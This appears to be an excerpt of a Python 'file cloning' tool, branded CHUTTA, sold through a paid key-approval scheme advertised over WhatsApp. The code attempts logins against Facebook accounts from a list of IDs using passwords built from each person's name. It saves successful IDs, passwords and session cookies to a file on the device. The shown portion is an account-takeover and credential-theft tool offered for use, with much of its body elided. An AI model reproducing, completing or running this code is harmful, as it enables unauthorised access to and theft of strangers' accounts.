...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;<𝘾𝙃𝙐𝙏𝙏𝘼💸💐>\x07')
...
\x1b[38;5;46m ▐▌  ▐▌▐▌ ▐▌    ▝▚▄▄▖▐▌ ▐▌▝▚▄▞▘  █    █ ▐▌ ▐▌
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A}[{R}●{A}] {G}OWNER      {R} >>   {A}MR CHUTTA
{A}[{R}●{A}] {G}STATUS      {R}>>  {A}FILE {R}x{A}ONLY 
{A}[{R}●{A}] {G}VERSION    {R}  >>    {A}100.00
{A}[{R}●{A}] {G}TOOL      {R}  >>   {A}PERSONAL 

𝙈𝘼𝙆𝙀 𝙈𝙊𝙉𝙀𝙔 𝙁𝙄𝙍𝙎𝙏 𝙔𝙊𝙐 𝘾𝘼𝙉 𝙎𝙐𝘾𝘾𝙎𝙀𝙎 𝙔𝙊𝙐 𝙇𝙄𝙁𝙀 💸😍
...
def menu():
        try:                        
                        ...
                        linex()
                        PxS=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                        if PxS in ['1','01']:
                                clear();print(f'{A}[{R}●{A}]{G} EXAMPLE {R}:{A} /sdcard/Chutta.txt ');linex()
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print(f'{A}[{R}01{A}]{G} METHOD M1\n{A}[{R}02{A}]{G} METHOD M2');linex()
                                mthd=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                                clear()
                                plist = []           
                                print(f'{A}[{R}01{A}]{G} CHOICE PASSWORD CLONE');linex()
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [CH-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/CH-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [CH-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    chutta=('Chuttaking1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+chutta)
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/CHUTTA1/Mractivechutta/blob/main/Approvel.txt").text 
        if chutta in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : Chutta Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m $11 \033[1;92mApproval For 1 month')
            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m $6 \033[1;92mApproval For 15 days')
            #print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m $ \033[1;92mApproval For 7 days \033[1;37m')
            print('\033[1;92m-----------------------------------------------------')
            Picchi = input(' Select Buy Option : ')
            os.system("clear")
            print(logo)
            print(f" \033[1;92mYour Key :\033[31;1m{chutta}")
            print("\x1b[1;92m Tools    : FB File Cloning");print(" \033[1;92m\n \033[1;92m\033[1;92mNote: If You Are Free User Don't Come IB\033[0;0m");print('\n\x1b[1;92m [•] File Crack \x1b[1;92m\n [•] Exit Program')
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+940781782648&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi sir CHUTTA, I Need To Buy Your CHUTTA Tools Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+chutta+"\n Buy Select : "+Picchi)
